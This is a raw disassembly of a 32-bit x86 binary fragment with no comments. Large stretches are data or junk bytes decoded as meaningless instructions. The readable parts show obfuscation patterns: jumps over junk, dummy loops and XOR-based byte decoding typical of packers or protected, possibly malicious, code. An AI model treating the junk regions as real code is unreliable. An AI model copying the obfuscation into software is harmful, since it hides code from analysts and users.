  410b57:	sbb    BYTE PTR [ecx],dh
  410b59:	(bad)  [ebp+0x1e]
  410b5c:	pop    ds
  410b5d:	daa    
  410b5e:	out    0xba,al
  410b60:	imul   ecx,esi,0x8d9a0932
  410b66:	es dec ecx
  410b68:	das    
  410b69:	dec    ebp
  410b6a:	neg    DWORD PTR [ebp-0x6210bd8e]
  410b70:	ins    BYTE PTR es:[edi],dx
  410b71:	stos   DWORD PTR es:[edi],eax
  410b72:	mov    ah,0x8c
  410b74:	pop    eax
  410b75:	clc    
  410b76:	or     BYTE PTR [eax+ebx*4],dh
  410b79:	aaa    
  410b7a:	jne    0x410bbd
  410b7c:	and    esi,ebp
  410b7e:	add    cl,dh
  410b80:	adc    DWORD PTR [esi+0x4c54fe5e],edi
  410b86:	hlt    
  410b87:	jmp    0xabf7:0xa0acac0e
  410b8e:	ins    DWORD PTR es:[edi],dx
  410b8f:	mov    edx,0x8c98c9c8
  410b94:	inc    edi
  410b95:	mov    bh,0xf9
  410b97:	imul   ecx,edi,0xe904c624
  410b9d:	xchg   ebx,eax
  410b9e:	lock in al,dx
  410ba0:	out    dx,al
  410ba1:	jnp    0x410b75
  410ba3:	fisttp DWORD PTR [ecx+ebp*4]
  410ba6:	daa    
  410ba7:	cwde   
  410ba8:	dec    eax
  410ba9:	in     al,dx
  410baa:	stos   BYTE PTR es:[edi],al
  410bab:	mov    esi,0xfae6982c
  410bb0:	pop    esi
  410bb1:	dec    esp
  410bb2:	test   BYTE PTR [eax+0x5e],dh
  410bb5:	test   DWORD PTR [edx+0x6ab07f90],0x5f5c8e62
  410bbf:	mov    edi,0xb384898
  410bc4:	sub    al,0x96
  410bc6:	pushf  
  410bc7:	cli    
  410bc8:	sbb    edx,DWORD PTR [esi]
  410bca:	mov    dh,0xb7
  410bcc:	xor    DWORD PTR [edi],eax
  410bce:	stos   BYTE PTR es:[edi],al
  410bcf:	rcl    esi,cl
  410bd1:	dec    esi
  410bd2:	push   ss
  410bd3:	test   DWORD PTR [ebx],edx
  410bd5:	mov    bh,BYTE PTR [ecx-0x3e283931]
  410bdb:	aad    0x9e
  410bdd:	lea    ecx,[ebp+0x25]
  410be0:	inc    ebp
  410be1:	test   DWORD PTR [edx-0x54],0xf9ebf22
  410be8:	mov    DWORD PTR [eax-0x68],0x92cf7add
  410bef:	pop    eax
  410bf0:	mov    bh,0x94
  410bf2:	mul    eax
  410bf4:	mov    ebx,0xd107f500
  410bf9:	test   BYTE PTR [edx+0x34c9fc15],0x62
  410c00:	ja     0x410bec
  410c02:	pop    ebx
  410c03:	jle    0x410c71
  410c05:	mov    cl,0x56
  410c07:	jecxz  0x410c0a
  410c09:	aaa    
  410c0a:	ja     0x410c3c
  410c0c:	cld    
  410c0d:	in     eax,0xbe
  410c0f:	lods   eax,DWORD PTR ds:[esi]
  410c10:	add    edi,DWORD PTR [ebx]
  410c12:	cmp    DWORD PTR [esi],ebx
  410c14:	jb     0x410c3d
  410c16:	sub    dl,BYTE PTR [ebp+0x6b]
  410c19:	popa   
  410c1a:	adc    al,0x94
  410c1c:	arpl   WORD PTR [ecx],ax
  410c1e:	mov    esp,ds
  410c20:	cli    
  410c21:	outs   dx,BYTE PTR ds:[esi]
  410c22:	fwait
  410c23:	mov    dl,0x4f
  410c25:	aas    
  410c26:	frstor [edi-0x2108f547]
  410c2c:	adc    esi,DWORD PTR [ebx-0x35]
  410c2f:	jg     0x410bff
  410c31:	(bad)  
  410c32:	mov    ds:0x20d167a2,eax
  410c37:	pop    edx
  410c38:	adc    eax,0xea0aca51
  410c3d:	push   edi
  410c3e:	inc    ecx
  410c3f:	dec    edi
  410c40:	inc    ebx
  410c41:	(bad)  [edx+ebp*4]
  410c44:	pop    edi
  410c45:	cmp    eax,0xa3c6e234
  410c4a:	daa    
  410c4b:	repz in eax,dx
  410c4d:	jb     0x410c36
  410c4f:	pop    ss
  410c50:	cmp    ch,BYTE PTR [esi+edi*1-0x70ee5d8e]
  410c57:	jae    0x410c7b
  410c59:	test   eax,0x7f6f504b
  410c5e:	or     ecx,DWORD PTR [edi-0x40b05802]
  410c64:	iret   
  410c65:	retf   
  410c66:	pushf  
  410c67:	push   cs
  410c68:	mov    bh,0xd3
  410c6a:	shl    BYTE PTR [edi],0x57
  410c6d:	lock mov edx,0xa40f3558
  410c73:	aad    0x9e
  410c75:	sub    BYTE PTR [eax+0x6d],0xa0
  410c79:	push   esp
  410c7a:	xor    bl,BYTE PTR [ecx+0x26]
  410c7d:	arpl   WORD PTR [esi],sp
  410c7f:	popa   
  410c80:	adc    bl,BYTE PTR [eax-0x574b3930]
  410c86:	test   BYTE PTR [edx-0x3802a1e3],ah
  410c8c:	jnp    0x410c4c
  410c8e:	add    eax,0x6d937210
  410c93:	mov    bh,0x29
  410c95:	in     eax,0x7b
  410c97:	(bad)  
  410c98:	push   0x6c
  410c9a:	dec    ebp
  410c9b:	add    eax,0x69b78ee8
  410ca0:	ins    BYTE PTR es:[edi],dx
  410ca1:	xchg   edx,eax
  410ca2:	sbb    ah,ch
  410ca4:	aas    
  410ca5:	out    0x16,eax
  410ca7:	xchg   DWORD PTR [esi-0x6b],edi
  410caa:	test   bh,al
  410cac:	inc    ebp
  410cad:	clc    
  410cae:	xor    DWORD PTR [ebp-0x3ff40764],eax
  410cb4:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  410cbb:	mov    eax,DWORD PTR [ebp-0x8]
  410cbe:	or     DWORD PTR ds:0x4337ef,0x3fd0
  410cc8:	mov    ecx,0x7510854
  410ccd:	mov    DWORD PTR ds:0x43372f,0x62c3
  410cd7:	push   esi
  410cd8:	xor    eax,ecx
  410cda:	or     esi,DWORD PTR ds:0x43372f
  410ce0:	mov    esi,0x32729b
  410ce5:	add    eax,esi
  410ce7:	jmp    0x410cfe
  410cec:	mov    dl,BYTE PTR [ebp-0x1]
  410cef:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  410cf3:	mov    DWORD PTR ds:0x43372f,0x530d
  410cfd:	inc    eax
  410cfe:	mov    DWORD PTR ds:0x43376b,0x3584
  410d08:	cmp    eax,0x40
  410d0b:	mov    DWORD PTR ds:0x43377f,0x3d5c
  410d15:	jb     0x410cec
  410d1b:	mov    eax,ds:0x43372f
  410d20:	add    eax,DWORD PTR ds:0x433803
  410d26:	mov    ds:0x43372f,eax
  410d2b:	mov    edx,DWORD PTR [ebp-0x8]
  410d2e:	mov    DWORD PTR ds:0x43383f,0x17
  410d38:	cmp    DWORD PTR ds:0x43383f,0x0
  410d3f:	je     0x410d94
  410d45:	cmp    DWORD PTR ds:0x43383f,0x4
  410d4c:	jne    0x410d69
  410d52:	push   DWORD PTR [ebp-0x20]
  410d55:	push   DWORD PTR [ebp-0x28]
  410d58:	push   DWORD PTR [ebp-0xc]
  410d5b:	push   DWORD PTR [ebp-0x1c]
  410d5e:	push   0x2fed
  410d63:	call   DWORD PTR ds:0x4123b0
  410d69:	cmp    DWORD PTR ds:0x43383f,0x5
  410d70:	jne    0x410d84
  410d76:	xor    eax,eax
  410d78:	xor    eax,DWORD PTR ds:0x43383f
  410d7e:	dec    eax
  410d7f:	mov    ds:0x43383f,eax
  410d84:	mov    eax,ds:0x43383f
  410d89:	dec    eax
  410d8a:	mov    ds:0x43383f,eax
  410d8f:	jmp    0x410d38
  410d94:	mov    eax,DWORD PTR [ebp-0xc]
  410d97:	add    DWORD PTR ds:0x433723,0x2cfa
  410da1:	xor    edx,ecx
  410da3:	sbb    DWORD PTR ds:0x43383b,0x4112
  410dad:	add    edx,esi
  410daf:	mov    DWORD PTR ds:0x4337b3,0x2f1c
  410db9:	cmp    edx,eax
  410dbb:	jmp    0x410f57
  410dc0:	adc    al,0x14
  410dc2:	in     al,0x8b
  410dc4:	in     al,0x6b
  410dc6:	jno    0x410d59
  410dc8:	aad    0x1d
  410dca:	dec    ebx
  410dcb:	add    bh,BYTE PTR [eax-0x7392bdb6]
  410dd1:	inc    edi
  410dd2:	jle    0x410e52
  410dd4:	icebp  
  410dd5:	jg     0x410e55
  410dd7:	jle    0x410e47
  410dd9:	pop    edx
  410dda:	mov    edx,edx
  410ddc:	(bad)  
  410ddd:	add    ah,BYTE PTR cs:[edx]
  410de0:	outs   dx,BYTE PTR ds:[esi]
  410de1:	jmp    0xdfaa75d9
  410de6:	cmp    BYTE PTR [esi-0x1d],0x3d
  410dea:	or     ebp,esp
  410dec:	hlt    
  410ded:	shl    BYTE PTR [eax+edx*4+0x475e360a],cl
  410df4:	mov    cl,0x93
  410df6:	int    0x9a
  410df8:	cwde   
  410df9:	iret   
  410dfa:	jnp    0x410e45
  410dfc:	ins    DWORD PTR es:[edi],dx
  410dfd:	sbb    bh,0xc8
  410e00:	jmp    0x520dba33
  410e05:	stos   BYTE PTR es:[edi],al
  410e06:	mov    ecx,0x4897d03c
  410e0b:	xchg   edi,eax
  410e0c:	bound  dx,DWORD PTR [ebx+0x204f3d59]
  410e13:	cld    
  410e14:	mov    dl,0x47
  410e16:	xor    dh,cl
  410e18:	imul   ebx,DWORD PTR [eax-0x3b534ca6],0x45
  410e1f:	add    DWORD PTR [eax],0xe5605cd3
  410e25:	sar    dl,0x67
  410e28:	or     eax,0x41f7d09c
  410e2d:	jno    0x410e45
  410e2f:	dec    ecx
  410e30:	adc    al,0x58
  410e32:	sub    DWORD PTR [ebx+0x5a],esi
  410e35:	gs call 0x324bfaff
  410e3b:	xchg   edx,eax
  410e3c:	fistp  WORD PTR [ecx-0x2b1fc998]
  410e42:	push   ebp
  410e43:	push   ebp
  410e44:	add    BYTE PTR [edx-0x12],bh
  410e47:	ficom  DWORD PTR [esi-0x1583601a]
  410e4d:	call   0x9ef44bce
  410e52:	cs out 0x9f,eax
  410e55:	xor    eax,0x8f4a36c1
  410e5a:	sti    
  410e5b:	jne    0x410ed9
  410e5d:	leave  
  410e5e:	mov    ebp,DWORD PTR [esi]
  410e60:	and    ebp,0xc823185e
  410e66:	sti    
  410e67:	int3   
  410e68:	add    al,0xa3
  410e6a:	xlat   BYTE PTR ds:[ebx]
  410e6b:	fidiv  WORD PTR [ebp+0x11fa3aa5]
  410e71:	sar    BYTE PTR [ebx+0x6b6ad827],1
  410e77:	mov    dh,0xb8
  410e79:	fmul   QWORD PTR [esi-0x66]
  410e7c:	sub    DWORD PTR [esi+0x53],0xffffffdf
  410e80:	mov    al,ds:0x21bcc2ce
  410e85:	mov    cl,0x7d
  410e87:	retf   0xd5f7
  410e8a:	aam    0xef
  410e8c:	push   0x93567e5c
  410e91:	je     0x410ec5
  410e93:	or     BYTE PTR [eax-0x45],ch
  410e96:	xchg   ecx,eax
  410e97:	mov    al,0xa0
  410e99:	mov    edi,0xbce2ccc6
  410e9e:	sub    eax,0xc7e6349f
  410ea3:	dec    eax
  410ea4:	and    dl,al
  410ea6:	xor    BYTE PTR [esi],dh
  410ea8:	sbb    eax,0xa899babe
  410ead:	mov    eax,0x458f2f20
  410eb2:	xchg   ecx,ebx
  410eb4:	mov    dl,0x5a
  410eb6:	mov    eax,0x19b65aa6
  410ebb:	mov    ecx,0x11fa98d3
  410ec0:	pusha  
  410ec1:	xchg   ebx,eax
  410ec2:	stc    
  410ec3:	and    eax,0x93eb2e07
  410ec8:	cmp    cl,BYTE PTR [eax]
  410eca:	rcr    edi,0x5f
  410ecd:	mov    ecx,gs
  410ecf:	push   0xffffffd0
  410ed1:	add    eax,0x686cf09e
  410ed6:	jecxz  0x410ec3
  410ed8:	popa   
  410ed9:	mov    ds:0x4bdcddf2,eax
  410ede:	out    dx,al
  410edf:	push   eax
  410ee0:	mov    ebp,DWORD PTR [edx]
  410ee2:	sub    bl,BYTE PTR [edi]
  410ee4:	mov    BYTE PTR [ebx+0x21],dl
  410ee7:	adc    ch,cl
  410ee9:	scas   al,BYTE PTR es:[edi]
  410eea:	int3   
  410eeb:	push   ebx
  410eec:	sub    eax,0xee988dc1
  410ef1:	int    0x2c
  410ef3:	int    0x91
  410ef5:	out    dx,eax
  410ef6:	xchg   ebx,eax
  410ef7:	mov    ch,0xd3
  410ef9:	mov    al,0xbb
  410efb:	shr    BYTE PTR [ecx],0x8b
  410efe:	loop   0x410f5c
  410f00:	adc    BYTE PTR [edx-0x71d4c369],0xde
  410f07:	les    esp,FWORD PTR [ebx-0x179ab0ef]
  410f0d:	xlat   BYTE PTR ds:[ebx]
  410f0e:	test   al,bh
  410f10:	scas   eax,DWORD PTR es:[edi]
  410f11:	outs   dx,DWORD PTR ds:[esi]
  410f12:	out    dx,eax
  410f13:	loopne 0x410f6d
  410f15:	in     eax,0x2d
  410f17:	int    0x36
  410f19:	jo     0x410f58
  410f1b:	in     eax,dx
  410f1c:	mov    WORD PTR cs:[ecx+0x3ec0eb83],ss
  410f23:	jge    0x410f68
  410f25:	fldz   
  410f27:	scas   eax,DWORD PTR es:[edi]
  410f28:	dec    edx
  410f29:	fisubr DWORD PTR [eax-0x7d6c466b]
  410f2f:	dec    ebx
  410f30:	pop    ecx
  410f31:	pop    esi
  410f32:	jo     0x410eb7
  410f34:	lods   al,BYTE PTR ds:[esi]
  410f35:	(bad)  
  410f37:	pop    esp
  410f38:	cs pop edi
  410f3a:	mov    ebx,0xa5e302f6
  410f3f:	pop    ebp
  410f40:	scas   eax,DWORD PTR es:[edi]
  410f41:	je     0x410f52
  410f43:	nop
  410f44:	dec    ebp
  410f45:	or     dl,ah
  410f47:	outs   dx,DWORD PTR ds:[esi]
  410f48:	sbb    eax,0x4fc8e518
  410f4d:	in     eax,dx
  410f4e:	cdq    
  410f4f:	dec    ecx
  410f50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f51:	sub    al,0x6e
  410f53:	aas    
  410f54:	mov    edx,0x840f7c9f
  410f59:	push   edi
  410f5a:	add    al,BYTE PTR [eax]
  410f5c:	add    BYTE PTR [ebx],dh
  410f5e:	rol    BYTE PTR [ebx],0x5
  410f61:	das    
  410f62:	cmp    BYTE PTR [ebx+0x0],al
  410f65:	sub    DWORD PTR ds:0x433833,eax
  410f6b:	push   ebx
  410f6c:	sub    eax,0x37b3
  410f71:	push   edi
  410f72:	mov    DWORD PTR ds:0x43377f,0x14
  410f7c:	cmp    DWORD PTR ds:0x43377f,0x0
  410f83:	je     0x410fda
  410f89:	cmp    DWORD PTR ds:0x43377f,0x2
  410f90:	jne    0x410fac
  410f96:	push   0x4337b3
  410f9b:	push   DWORD PTR [ebp-0x24]
  410f9e:	push   DWORD PTR [ebp-0x24]
  410fa1:	push   0x4a42
  410fa6:	call   DWORD PTR ds:0x4123b4
  410fac:	cmp    DWORD PTR ds:0x43377f,0x3
  410fb3:	jne    0x410fc6
  410fb9:	mov    edi,DWORD PTR ds:0x43377f
  410fbf:	dec    edi
  410fc0:	mov    DWORD PTR ds:0x43377f,edi
  410fc6:	xor    edi,edi
  410fc8:	or     edi,DWORD PTR ds:0x43377f
  410fce:	dec    edi
  410fcf:	mov    DWORD PTR ds:0x43377f,edi
  410fd5:	jmp    0x410f7c
  410fda:	mov    edi,DWORD PTR [ebp+0x8]
  410fdd:	mov    eax,0x8a3c
  410fe2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410fe7:	jmp    0x411183
  410fec:	mov    dh,0xd4
  410fee:	ja     0x411052
  410ff0:	jne    0x411053
  410ff2:	mov    bl,0xd0
  410ff4:	ins    DWORD PTR es:[edi],dx
  410ff5:	push   edi
  410ff6:	push   ss
  410ff7:	push   ecx
  410ff8:	call   0x7e45:0xf48a1f6
  410fff:	jle    0x410ff2
  411001:	jg     0x411081
  411003:	jle    0x41100c
  411005:	cli    
  411006:	call   0xc6a0:0xf71f64de
  41100d:	and    esp,esp
  41100f:	inc    ecx
  411010:	outs   dx,DWORD PTR ds:[esi]
  411011:	mov    bh,0xa8
  411013:	cmp    al,0xde
  411015:	jo     0x410fe4
  411017:	loop   0x411055
  411019:	(bad)  
  41101a:	imul   ebx,esi,0x4f
  41101d:	cdq    
  41101e:	scas   al,BYTE PTR es:[edi]
  41101f:	mov    dh,0x75
  411021:	dec    eax
  411022:	sbb    DWORD PTR [esi+0x3f],0xffffffff
  411026:	imul   esp,edx,0x617ba379
  41102c:	or     BYTE PTR [eax+0x4f],ch
  41102f:	fcmovnb st,st(2)
  411031:	jle    0x411032
  411033:	test   DWORD PTR [eax+0x263c34ee],0xeb61f1f9
  41103d:	in     eax,0xfa
  41103f:	mov    dl,BYTE PTR [ecx-0xa]
  411042:	xchg   edx,eax
  411043:	mov    al,ds:0xcd43cc9
  411048:	hlt    
  411049:	shl    esp,1
  41104b:	scas   eax,DWORD PTR es:[edi]
  41104c:	and    esp,edx
  41104e:	xlat   BYTE PTR ds:[ebx]
  41104f:	dec    eax
  411050:	jmp    0x410fdf
  411052:	dec    eax
  411053:	cdq    
  411054:	push   edi
  411055:	in     eax,0xb9
  411057:	push   0xffffffaa
  411059:	(bad)  
  41105a:	cld    
  41105b:	or     ebx,DWORD PTR [esi-0x80]
  41105e:	mov    eax,0x326e07b5
  411063:	or     ch,BYTE PTR [edx+esi*8-0x55118df5]
  41106a:	push   edx
  41106b:	inc    edi
  41106c:	daa    
  41106d:	add    DWORD PTR [esi-0x68],0xb3193389
  411074:	add    ebx,esp
  411076:	iret   
  411077:	sub    DWORD PTR [edx],0x784a0f9f
  41107d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41107e:	in     eax,dx
  41107f:	rep ins DWORD PTR es:[edi],dx
  411081:	xor    al,0x61
  411083:	sub    eax,edi
  411085:	inc    edx
  411086:	jno    0x4110bc
  411088:	sub    bl,cl
  41108a:	fwait
  41108b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41108c:	outs   dx,DWORD PTR ds:[esi]
  41108d:	ins    DWORD PTR es:[edi],dx
  41108e:	pop    ebp
  41108f:	pusha  
  411090:	out    0xb3,al
  411092:	mov    ecx,0x31414a54
  411097:	add    al,0x24
  411099:	sub    eax,0x84659cb7
  41109e:	lods   eax,DWORD PTR ds:[esi]
  41109f:	sbb    edx,DWORD PTR [edx-0x9]
  4110a2:	push   ebx
  4110a3:	setle  BYTE PTR [ebx-0x75b2ddc4]
  4110aa:	dec    edx
  4110ab:	mov    al,0xf5
  4110ad:	dec    esp
  4110ae:	in     eax,dx
  4110af:	(bad)  
  4110b0:	clc    
  4110b1:	pop    esp
  4110b2:	jnp    0x4110d1
  4110b4:	dec    ebp
  4110b5:	std    
  4110b6:	pop    edi
  4110b7:	pop    ebx
  4110b8:	dec    ebx
  4110b9:	ret    0xdff1
  4110bc:	xchg   ebx,eax
  4110bd:	mov    bh,BYTE PTR cs:[ecx-0x3a]
  4110c1:	dec    esp
  4110c2:	sub    ecx,esp
  4110c4:	retf   0x71be
  4110c7:	int    0xf
  4110c9:	ds pop esi
  4110cb:	add    eax,0x53688ff2
  4110d0:	in     al,0xfa
  4110d2:	lods   al,BYTE PTR ds:[esi]
  4110d3:	dec    esp
  4110d4:	xchg   edi,eax
  4110d5:	out    dx,eax
  4110d6:	jge    0x411061
  4110d8:	fadd   QWORD PTR [edi-0x24fb78fa]
  4110de:	jns    0x411074
  4110e0:	mov    eax,ds:0x5ee2863e
  4110e5:	or     DWORD PTR [eax+0x1b],0x1d
  4110e9:	fs (bad) 
  4110ec:	scas   al,BYTE PTR es:[edi]
  4110ed:	mov    al,0xbc
  4110ef:	addr16 retf 
  4110f1:	ins    BYTE PTR es:[edi],dx
  4110f2:	push   0x95509bc6
  4110f7:	mov    ?,WORD PTR [edx+edi*1+0x23e766c]
  4110fe:	or     eax,0x703b8112
  411103:	mov    ebp,0xa91a9c8e
  411108:	jle    0x41110f
  41110a:	and    al,BYTE PTR [ecx]
  41110c:	enter  0xb44e,0x8a
  411110:	mov    al,0x1d
  411112:	fs out 0xad,eax
  411115:	popa   
  411116:	push   ds
  411117:	in     al,0xce
  411119:	add    edx,eax
  41111b:	or     eax,0xc708ce19
  411120:	or     eax,0x9bc7f859
  411125:	mov    dh,0x3e
  411127:	shr    BYTE PTR [edi-0x76],cl
  41112a:	sub    DWORD PTR [edi-0x1c],eax
  41112d:	xor    BYTE PTR [edx],cl
  41112f:	or     BYTE PTR [edx+0x5ce59a9b],bl
  411135:	xor    al,0x1b
  411137:	test   esp,0xf4563b46
  41113d:	mov    edx,0x9f81b71e
  411142:	pop    es
  411143:	mov    ebp,0x13fedb65
  411149:	pushf  
  41114a:	push   ecx
  41114b:	daa    
  41114c:	pop    eax
  41114d:	sbb    esi,DWORD PTR [ebp-0x7d]
  411150:	pop    edx
  411151:	sub    edx,DWORD PTR [ebx+0x4e800c51]
  411157:	scas   al,BYTE PTR es:[edi]
  411158:	xor    BYTE PTR [ebx+0x26],al
  41115b:	push   eax
  41115c:	ret    0xa2a0
  41115f:	cli    
  411160:	sub    eax,0xe0658f2f
  411165:	dec    esi
  411166:	stos   DWORD PTR es:[edi],eax
  411167:	pop    ds
  411168:	sub    ecx,0xfffffff9
  41116b:	adc    eax,0xa1fb6c4f
  411170:	bound  esp,QWORD PTR [eax+0x59409e14]
  411176:	sub    al,0x2
  411178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411179:	push   ebp
  41117a:	cdq    
  41117b:	ja     0x4111d3
  41117d:	xchg   ebx,eax
  41117e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41117f:	mov    ds:0xbf3fc311,al
  411184:	add    bh,BYTE PTR [ebx]
  411186:	add    BYTE PTR [eax],al
  411188:	add    ax,di
  41118b:	movzx  eax,ax
  41118e:	mov    DWORD PTR [ebp-0x14],eax
  411191:	mov    eax,DWORD PTR [ebp+0x8]
  411194:	movzx  eax,WORD PTR [eax+edx*4]
  411198:	xor    eax,0x8a3c
  41119d:	add    eax,edi
  41119f:	mov    edi,DWORD PTR [ebp-0x14]
  4111a2:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4111a6:	mov    eax,DWORD PTR [ebp-0xc]
  4111a9:	inc    edx
  4111aa:	cmp    edx,eax
  4111ac:	jne    0x410f72
  4111b2:	pop    edi
  4111b3:	pop    ebx
  4111b4:	mov    eax,DWORD PTR [ebp-0x8]
  4111b7:	mov    edx,DWORD PTR [ebp+0x10]
  4111ba:	xor    eax,ecx
  4111bc:	add    eax,esi
  4111be:	mov    DWORD PTR [edx],eax
  4111c0:	mov    eax,DWORD PTR [ebp-0x8]
  4111c3:	xor    eax,ecx
  4111c5:	add    eax,esi
  4111c7:	mov    DWORD PTR [ebp+0x8],eax
  4111ca:	mov    eax,DWORD PTR [ebp+0x8]
  4111cd:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4111d1:	mov    dl,BYTE PTR [ebp-0x1]
  4111d4:	cmp    al,dl
  4111d6:	je     0x4113b5
  4111dc:	mov    eax,DWORD PTR [ebp+0x8]
  4111df:	jmp    0x41137b
  4111e4:	mov    ah,0x98
  4111e6:	adc    al,ch
  4111e8:	adc    dh,BYTE PTR [ebp+0x71]
  4111eb:	imul   ebx,ebp,0xa2dabba7
  4111f1:	pop    ds
  4111f2:	xchg   esi,eax
  4111f3:	sub    al,0x8e
  4111f5:	inc    edx
  4111f6:	jle    0x411276
  4111f8:	icebp  
  4111f9:	jg     0x411279
  4111fb:	jle    0x41123f
  4111fd:	stos   DWORD PTR es:[edi],eax
  4111fe:	dec    esp
  4111ff:	das    
  411200:	call   0x8debcd8d
  411205:	pop    es
  411206:	ror    BYTE PTR [ecx],cl
  411208:	push   edi
  411209:	xchg   ebp,eax
  41120a:	mov    ecx,0xe64bad5b
  41120f:	stos   BYTE PTR es:[edi],al
  411210:	outs   dx,BYTE PTR ds:[esi]
  411211:	es (bad) 
  411213:	hlt    
  411214:	mov    esi,0xf9d2396a
  411219:	es mov eax,0x279b34e0
  41121f:	and    eax,0x6023b2f8
  411224:	push   cs
  411225:	jae    0x4111e5
  411227:	and    ch,BYTE PTR [eax+esi*2+0x3e]
  41122b:	(bad)  
  41122c:	xchg   edx,eax
  41122d:	sbb    bh,BYTE PTR [edx+0x53]
  411230:	mov    al,ds:0xb051bf02
  411235:	ds jp  0x4111c6
  411238:	xchg   esp,eax
  411239:	iret   
  41123a:	bound  eax,QWORD PTR [ebp+0x274160f5]
  411240:	(bad)  
  411241:	inc    edx
  411242:	pop    esp
  411243:	sub    dh,al
  411245:	ret    0x69db
  411248:	sbb    al,0xe4
  41124a:	jo     0x41125e
  41124c:	loope  0x4112bc
  41124e:	jns    0x411230
  411250:	cli    
  411251:	xchg   esi,eax
  411252:	hlt    
  411253:	cmp    dl,BYTE PTR ds:0xdd12c174
  411259:	and    ebx,DWORD PTR [ebp+ebp*1+0x48b369e2]
  411260:	imul   eax,esp,0x865d76f3
  411266:	imul   esi,DWORD PTR [ebx+0x3a30e3c2],0xd60ad00c
  411270:	lods   al,BYTE PTR ds:[esi]
  411271:	pop    eax
  411272:	and    al,0x6
  411274:	add    al,BYTE PTR [ecx]
  411276:	fisttp QWORD PTR [esi+0x14]
  411279:	inc    ebx
  41127a:	les    edi,FWORD PTR [ebx+0x3888a071]
  411280:	mov    ebx,0x3725551a
  411285:	cmp    BYTE PTR [ebp+0xb2de972],0x57
  41128c:	(bad)  
  41128d:	cdq    
  41128e:	scas   eax,DWORD PTR es:[edi]
  41128f:	lods   al,BYTE PTR ds:[esi]
  411290:	mov    dl,0xdf
  411292:	xchg   BYTE PTR [ebp-0xf0dfff5],ah
  411298:	les    edx,FWORD PTR [edx-0x15]
  41129b:	les    ebx,FWORD PTR [ebp+0x69a8c59a]
  4112a1:	cli    
  4112a2:	xor    BYTE PTR [edi-0x6c],al
  4112a5:	les    ecx,FWORD PTR [ebx]
  4112a7:	sub    bl,BYTE PTR [ecx]
  4112a9:	pop    ss
  4112aa:	xchg   edi,eax
  4112ab:	aam    0x9a
  4112ad:	add    BYTE PTR [esi],ch
  4112af:	aas    
  4112b0:	mov    esi,0xa7c3084
  4112b5:	dec    ecx
  4112b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112b7:	xor    eax,0xfb80d425
  4112bc:	outs   dx,DWORD PTR ds:[esi]
  4112bd:	leave  
  4112be:	push   esp
  4112bf:	shl    DWORD PTR [ebx+ebx*8-0x342708e0],1
  4112c6:	pop    edx
  4112c7:	xchg   ebx,eax
  4112c8:	jae    0x411343
  4112ca:	mov    cs,ecx
  4112cc:	inc    edx
  4112cd:	loope  0x4112e1
  4112cf:	xchg   ebx,eax
  4112d0:	pop    ebx
  4112d1:	out    dx,eax
  4112d2:	loop   0x41133a
  4112d4:	push   ebp
  4112d5:	push   edx
  4112d6:	mov    ebx,0xc739c16c
  4112db:	mov    ch,0x7a
  4112dd:	jne    0x411334
  4112df:	and    eax,0x8feadde3
  4112e4:	stos   BYTE PTR es:[edi],al
  4112e5:	fcomip st,st(7)
  4112e7:	cs popf 
  4112e9:	fwait
  4112ea:	push   ecx
  4112eb:	mov    dl,0x61
  4112ed:	in     eax,dx
  4112ee:	adc    cl,BYTE PTR [ebp+0x43fc0130]
  4112f4:	and    al,0x47
  4112f6:	jl     0x4112ed
  4112f8:	gs clc 
  4112fa:	inc    ecx
  4112fb:	jecxz  0x411301
  4112fd:	jmp    0x78f8ac30
  411302:	das    
  411303:	dec    ebp
  411304:	fsubr  st,st(4)
  411306:	adc    bl,BYTE PTR [edx-0x74]
  411309:	mov    al,dl
  41130b:	fadd   QWORD PTR [edx-0x25b11c65]
  411311:	retf   0xad54
  411314:	add    DWORD PTR [esi+0x22d5d902],esp
  41131a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41131b:	mov    BYTE PTR ds:0x16e8eeba,cl
  411321:	inc    edx
  411322:	enter  0xfba5,0xa2
  411326:	cwde   
  411327:	or     DWORD PTR [edx+0x77be7c12],0xe9d452bb
  411331:	push   edi
  411332:	inc    ebx
  411333:	xchg   BYTE PTR [edi-0x39c1b39],ch
  411339:	cld    
  41133a:	nop
  41133b:	or     ch,ch
  41133d:	jecxz  0x411363
  41133f:	in     al,dx
  411340:	jp     0x4113a4
  411342:	sub    eax,0x46eef5aa
  411347:	cwde   
  411348:	out    dx,al
  411349:	sti    
  41134a:	aad    0x78
  41134c:	cmp    BYTE PTR [esi+0x4461f798],0xa3
  411353:	xchg   esp,eax
  411354:	rol    BYTE PTR ds:0x972993a1,0x1b
  41135b:	inc    ecx
  41135c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41135d:	dec    esi
  41135e:	out    0x26,eax
  411360:	push   0xb14ba910
  411365:	xchg   DWORD PTR [eax-0x1eef2245],ebp
  41136b:	jg     0x411340
  41136d:	ret    0x3d0f
  411370:	mov    edi,0xdfd82f9d
  411375:	cmp    esi,DWORD PTR [edx+0x1b24a0e1]
  41137b:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  41137f:	mov    edx,DWORD PTR [ebp+0xc]
  411382:	cmp    al,BYTE PTR [edx]
  411384:	jne    0x411713
  41138a:	mov    eax,DWORD PTR [ebp-0x8]
  41138d:	mov    edx,DWORD PTR [ebp+0xc]
  411390:	movsx  edx,BYTE PTR [edx]
  411393:	xor    eax,ecx
  411395:	add    eax,esi
  411397:	cmp    edx,eax
  411399:	je     0x41156b
  41139f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4113a6:	lea    eax,[ebp-0x18]
  4113a9:	mov    DWORD PTR [ebp-0x14],eax
  4113ac:	mov    eax,DWORD PTR [ebp-0x14]
  4113af:	add    DWORD PTR [eax],0x705fa8f
  4113b5:	mov    eax,DWORD PTR [ebp-0x10]
  4113b8:	mov    edx,DWORD PTR [ebp+0x8]
  4113bb:	xor    eax,ecx
  4113bd:	lea    eax,[eax+edx*1+0x32729b]
  4113c4:	mov    DWORD PTR [ebp+0x8],eax
